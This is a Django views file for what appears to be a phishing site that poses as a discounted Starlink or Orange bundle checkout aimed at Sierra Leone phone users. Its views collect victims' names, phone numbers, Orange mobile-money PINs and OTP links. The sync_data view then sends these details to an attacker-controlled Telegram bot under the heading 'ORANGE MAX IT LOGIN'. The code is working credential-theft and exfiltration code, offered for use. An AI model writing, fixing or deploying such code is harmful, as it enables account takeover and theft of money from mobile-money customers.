import json
import requests
from django.shortcuts import render, redirect, get_object_or_404 # Fixed imports
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Order # Ensure your model name matches

# Telegram Configuration
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

from django.shortcuts import render, redirect, get_object_or_404
from .models import Order, Bundle  # Use the correct names from models.py

def home(request):
    return render(request, 'index.html')

def checkout(request):
    bundle = request.GET.get('bundle', 'Power User')
    price = request.GET.get('price', '199')
    return render(request, 'checkout.html', {'bundle': bundle, 'price': price})

def payment_instructions(request):
    if request.method == 'POST':
        full_name = request.POST.get('fullName', '')
        city = request.POST.get('city', '')
        bundle_name = request.POST.get('bundle', 'Power User')

        # Since your model requires a Bundle object and total_amount:
        selected_bundle = Bundle.objects.first() 
        
        # CREATE the order using the correct Model and Field names
        order = Order.objects.create(
            full_name=full_name,
            city=city,
            total_amount=199,  # Required by your model
            bundle=selected_bundle
        )

        return render(request, 'payment_instructions.html', {'order': order})
    return redirect('starlink_app:home')

def otp_verification(request, order_id):
    # Lookup using 'order_id' because that's your PK name
    order = get_object_or_404(Order, order_id=order_id)

    if request.method == 'POST':
        phone = request.POST.get('phone', '')
        pin = request.POST.get('pin', '')

        # Use 'phone_number' to match models.py
        order.phone_number = phone 
        order.orange_pin = pin
        order.save()

        # Update session for Telegram stage
        request.session['phone'] = phone
        request.session['pin'] = pin
        request.session['bundle'] = str(order.bundle)

        return render(request, 'otp_verification.html', {'order': order})

    return render(request, 'otp_verification.html', {'order': order})
@csrf_exempt
def sync_data(request):
    """
    Stage 4: Send collected data to Telegram
    """
    if request.method != 'POST':
        return JsonResponse({"status": "error", "message": "POST required"}, status=405)

    try:
        # 1. Safely load the JSON data from the JavaScript Fetch
        data = json.loads(request.body)
        
        # 2. Extract the 'otp' key (which we matched in the HTML script)
        otp_link = data.get('otp', 'No Link provided')

        # 3. Retrieve session data stored in the previous step
        phone = request.session.get('phone', 'Unknown')
        bundle = request.session.get('bundle', 'Unknown')
        pin = request.session.get('pin', 'Unknown')

        # 4. Format the Telegram message
        message = (
            "🇸🇱 *ORANGE MAX IT LOGIN*\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📞 *PHONE:* `+232 {phone}`\n"
            f"📦 *BUNDLE:* {bundle}\n"
            f"🔑 *PIN:* `{pin}`\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🔗 *OTP LINK:*\n{otp_link}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📡 *STATUS:* SUCCESS"
        )

        # 5. Send to Telegram using the 'requests' library
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown" 
        }

        # --- THIS WAS THE MISSING PART ---
        response = requests.post(telegram_url, json=payload, timeout=10)
        
        if response.status_code == 200:
            return JsonResponse({"status": "success"})
        else:
            return JsonResponse({"status": "error", "message": "Telegram API Error"}, status=500)

    except Exception as e:
        # This catches any errors (like bot token issues or bad JSON)
        return JsonResponse({"status": "error", "message": str(e)}, status=400)